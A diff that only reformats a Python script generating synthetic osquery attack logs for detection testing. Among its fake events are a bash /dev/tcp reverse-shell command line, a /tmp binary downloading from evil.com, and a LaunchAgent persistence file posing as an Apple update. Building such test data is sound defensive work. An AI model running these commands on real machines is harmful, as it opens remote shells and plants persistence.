@@ -9,6 +9,7 @@ Scenarios:
 5. Privilege escalation (sudo to root)
 6. Data staging in /tmp
 """
+
 import argparse
 import json
 import random
@@ -18,41 +19,49 @@ from datetime import datetime, timedelta, timezone
 def generate_brute_force(host: str = "test-mac.local", attacker_ip: str = None) -> list[dict]:
     """Generate 10 failed SSH logins followed by 1 success."""
     if attacker_ip is None:
-        attacker_ip = f"185.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+        attacker_ip = (
+            f"185.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+        )
 
     events = []
     base_time = datetime.now(tz=timezone.utc) - timedelta(minutes=5)
 
     # Failed attempts
     for i in range(10):
-        events.append({
+        events.append(
+            {
+                "name": "logged_in_users",
+                "hostIdentifier": host,
+                "unixTime": int((base_time + timedelta(seconds=i * 30)).timestamp()),
+                "calendarTime": (base_time + timedelta(seconds=i * 30)).strftime(
+                    "%a %b %d %H:%M:%S %Y UTC"
+                ),
+                "columns": {
+                    "type": "failed",
+                    "user": "admin",
+                    "host": attacker_ip,
+                    "local_address": attacker_ip,
+                },
+                "action": "added",
+            }
+        )
+
+    # Successful login
+    events.append(
+        {
             "name": "logged_in_users",
             "hostIdentifier": host,
-            "unixTime": int((base_time + timedelta(seconds=i*30)).timestamp()),
-            "calendarTime": (base_time + timedelta(seconds=i*30)).strftime("%a %b %d %H:%M:%S %Y UTC"),
+            "unixTime": int((base_time + timedelta(minutes=5)).timestamp()),
+            "calendarTime": (base_time + timedelta(minutes=5)).strftime("%a %b %d %H:%M:%S %Y UTC"),
             "columns": {
-                "type": "failed",
+                "type": "user",
                 "user": "admin",
                 "host": attacker_ip,
                 "local_address": attacker_ip,
             },
             "action": "added",
-        })
-
-    # Successful login
-    events.append({
-        "name": "logged_in_users",
-        "hostIdentifier": host,
-        "unixTime": int((base_time + timedelta(minutes=5)).timestamp()),
-        "calendarTime": (base_time + timedelta(minutes=5)).strftime("%a %b %d %H:%M:%S %Y UTC"),
-        "columns": {
-            "type": "user",
-            "user": "admin",
-            "host": attacker_ip,
-            "local_address": attacker_ip,
-        },
-        "action": "added",
-    })
+        }
+    )
 
     return events
 
@@ -63,37 +72,41 @@ def generate_reverse_shell(host: str = "test-mac.local") -> list[dict]:
     base_time = datetime.now(tz=timezone.utc) - timedelta(minutes=2)
 
     # Bash process with /dev/tcp
-    events.append({
-        "name": "processes",
-        "hostIdentifier": host,
-        "unixTime": int(base_time.timestamp()),
-        "calendarTime": base_time.strftime("%a %b %d %H:%M:%S %Y UTC"),
-        "columns": {
-            "pid": str(random.randint(1000, 9999)),
-            "name": "bash",
-            "path": "/bin/bash",
-            "cmdline": "bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
-            "uid": "0",
-        },
-        "action": "added",
-    })
+    events.append(
+        {
+            "name": "processes",
+            "hostIdentifier": host,
+            "unixTime": int(base_time.timestamp()),
+            "calendarTime": base_time.strftime("%a %b %d %H:%M:%S %Y UTC"),
+            "columns": {
+                "pid": str(random.randint(1000, 9999)),
+                "name": "bash",
+                "path": "/bin/bash",
+                "cmdline": "bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+                "uid": "0",
+            },
+            "action": "added",
+        }
+    )
 
     # Socket connection
-    events.append({
-        "name": "open_sockets",
-        "hostIdentifier": host,
-        "unixTime": int(base_time.timestamp()),
-        "calendarTime": base_time.strftime("%a %b %d %H:%M:%S %Y UTC"),
-        "columns": {
-            "pid": str(random.randint(1000, 9999)),
-            "remote_address": "192.168.1.100",
-            "remote_port": "4444",
-            "local_address": "10.0.0.5",
-            "local_port": str(random.randint(40000, 60000)),
-            "protocol": "6",  # TCP
-        },
-        "action": "added",
-    })
+    events.append(
+        {
+            "name": "open_sockets",
+            "hostIdentifier": host,
+            "unixTime": int(base_time.timestamp()),
+            "calendarTime": base_time.strftime("%a %b %d %H:%M:%S %Y UTC"),
+            "columns": {
+                "pid": str(random.randint(1000, 9999)),
+                "remote_address": "192.168.1.100",
+                "remote_port": "4444",
+                "local_address": "10.0.0.5",
+                "local_port": str(random.randint(40000, 60000)),
+                "protocol": "6",  # TCP
+            },
+            "action": "added",
+        }
+    )
 
     return events
 
@@ -105,21 +118,25 @@ def generate_data_exfiltration(host: str = "test-mac.local") -> list[dict]:
 
     # Multiple connections to rare external IP
     for i in range(50):
-        events.append({
-            "name": "open_sockets",
-            "hostIdentifier": host,
-            "unixTime": int((base_time + timedelta(seconds=i*10)).timestamp()),
-            "calendarTime": (base_time + timedelta(seconds=i*10)).strftime("%a %b %d %H:%M:%S %Y UTC"),
-            "columns": {
-                "pid": str(random.randint(1000, 9999)),
-                "remote_address": f"45.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
-                "remote_port": "31337",
-                "local_address": "10.0.0.5",
-                "local_port": str(random.randint(40000, 60000)),
-                "protocol": "6",
-            },
-            "action": "added",
-        })
+        events.append(
+            {
+                "name": "open_sockets",
+                "hostIdentifier": host,
+                "unixTime": int((base_time + timedelta(seconds=i * 10)).timestamp()),
+                "calendarTime": (base_time + timedelta(seconds=i * 10)).strftime(
+                    "%a %b %d %H:%M:%S %Y UTC"
+                ),
+                "columns": {
+                    "pid": str(random.randint(1000, 9999)),
+                    "remote_address": f"45.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
+                    "remote_port": "31337",
+                    "local_address": "10.0.0.5",
+                    "local_port": str(random.randint(40000, 60000)),
+                    "protocol": "6",
+                },
+                "action": "added",
+            }
+        )
 
     return events
 
@@ -130,35 +147,41 @@ def generate_persistence(host: str = "test-mac.local") -> list[dict]:
     base_time = datetime.now(tz=timezone.utc) - timedelta(minutes=3)
 
     # File event for LaunchAgent creation
-    events.append({
-        "name": "file_events",
-        "hostIdentifier": host,
-        "unixTime": int(base_time.timestamp()),
-        "calendarTime": base_time.strftime("%a %b %d %H:%M:%S %Y UTC"),
-        "columns": {
-            "target_path": "/Users/admin/Library/LaunchAgents/com.apple.update.plist",
-            "action": "CREATED",
-            "uid": "501",
-            "mode": "0644",
-        },
-        "action": "added",
-    })
+    events.append(
+        {
+            "name": "file_events",
+            "hostIdentifier": host,
+            "unixTime": int(base_time.timestamp()),
+            "calendarTime": base_time.strftime("%a %b %d %H:%M:%S %Y UTC"),
+            "columns": {
+                "target_path": "/Users/admin/Library/LaunchAgents/com.apple.update.plist",
+                "action": "CREATED",
+                "uid": "501",
+                "mode": "0644",
+            },
+            "action": "added",
+        }
+    )
 
     # Process event for launchctl — process_events (execution, event_type=start)
-    events.append({
-        "name": "process_events",
-        "hostIdentifier": host,
-        "unixTime": int((base_time + timedelta(seconds=30)).timestamp()),
-        "calendarTime": (base_time + timedelta(seconds=30)).strftime("%a %b %d %H:%M:%S %Y UTC"),
-        "columns": {
-            "pid": str(random.randint(1000, 9999)),
-            "name": "launchctl",
-            "path": "/bin/launchctl",
-            "cmdline": "launchctl load /Users/admin/Library/LaunchAgents/com.apple.update.plist",
-            "uid": "501",
-        },
-        "action": "added",
-    })
+    events.append(
+        {
+            "name": "process_events",
+            "hostIdentifier": host,
+            "unixTime": int((base_time + timedelta(seconds=30)).timestamp()),
+            "calendarTime": (base_time + timedelta(seconds=30)).strftime(
+                "%a %b %d %H:%M:%S %Y UTC"
+            ),
+            "columns": {
+                "pid": str(random.randint(1000, 9999)),
+                "name": "launchctl",
+                "path": "/bin/launchctl",
+                "cmdline": "launchctl load /Users/admin/Library/LaunchAgents/com.apple.update.plist",
+                "uid": "501",
+            },
+            "action": "added",
+        }
+    )
 
     return events
 
@@ -178,18 +201,22 @@ def generate_privilege_escalation(host: str = "test-mac.local") -> list[dict]:
     ]
 
     for i, cmd in enumerate(commands):
-        events.append({
-            "name": "shell_history",
-            "hostIdentifier": host,
-            "unixTime": int((base_time + timedelta(seconds=i*10)).timestamp()),
-            "calendarTime": (base_time + timedelta(seconds=i*10)).strftime("%a %b %d %H:%M:%S %Y UTC"),
-            "columns": {
-                "username": "admin",
-                "command": cmd,
-                "history_file": "/Users/admin/.zsh_history",
-            },
-            "action": "added",
-        })
+        events.append(
+            {
+                "name": "shell_history",
+                "hostIdentifier": host,
+                "unixTime": int((base_time + timedelta(seconds=i * 10)).timestamp()),
+                "calendarTime": (base_time + timedelta(seconds=i * 10)).strftime(
+                    "%a %b %d %H:%M:%S %Y UTC"
+                ),
+                "columns": {
+                    "username": "admin",
+                    "command": cmd,
+                    "history_file": "/Users/admin/.zsh_history",
+                },
+                "action": "added",
+            }
+        )
 
     return events
 
@@ -199,22 +226,24 @@ def generate_tmp_staging(host: str = "test-mac.local") -> list[dict]:
     events = []
     base_time = datetime.now(tz=timezone.utc) - timedelta(minutes=1)
 
-    events.append({
-        # process_events (the execution-event table, event_type=start after
-        # ECS mapping) — correlation detectors match executions, not state.
-        "name": "process_events",
-        "hostIdentifier": host,
-        "unixTime": int(base_time.timestamp()),
-        "calendarTime": base_time.strftime("%a %b %d %H:%M:%S %Y UTC"),
-        "columns": {
-            "pid": str(random.randint(1000, 9999)),
-            "name": "suspicious",
-            "path": "/tmp/suspicious",
-            "cmdline": "/tmp/suspicious --download http://evil.com/payload",
-            "uid": "501",
-        },
-        "action": "added",
-    })
+    events.append(
+        {
+            # process_events (the execution-event table, event_type=start after
+            # ECS mapping) — correlation detectors match executions, not state.
+            "name": "process_events",
+            "hostIdentifier": host,
+            "unixTime": int(base_time.timestamp()),
+            "calendarTime": base_time.strftime("%a %b %d %H:%M:%S %Y UTC"),
+            "columns": {
+                "pid": str(random.randint(1000, 9999)),
+                "name": "suspicious",
+                "path": "/tmp/suspicious",
+                "cmdline": "/tmp/suspicious --download http://evil.com/payload",
+                "uid": "501",
+            },
+            "action": "added",
+        }
+    )
 
     return events
 
@@ -228,17 +257,23 @@ def write_events_to_file(events: list[dict], output_path: str) -> None:
 
 def main():
     parser = argparse.ArgumentParser(description="Generate synthetic attack data")
-    parser.add_argument("--scenario", choices=[
-        "brute-force",
-        "reverse-shell",
-        "exfiltration",
-        "persistence",
-        "privilege-escalation",
-        "tmp-staging",
-        "all",
-    ], default="all", help="Attack scenario to generate")
-    parser.add_argument("--output", default="/var/log/osquery/attack_simulation.log",
-                        help="Output file path")
+    parser.add_argument(
+        "--scenario",
+        choices=[
+            "brute-force",
+            "reverse-shell",
+            "exfiltration",
+            "persistence",
+            "privilege-escalation",
+            "tmp-staging",
+            "all",
+        ],
+        default="all",
+        help="Attack scenario to generate",
+    )
+    parser.add_argument(
+        "--output", default="/var/log/osquery/attack_simulation.log", help="Output file path"
+    )
     parser.add_argument("--host", default="test-mac.local", help="Target hostname")
 
     args = parser.parse_args()
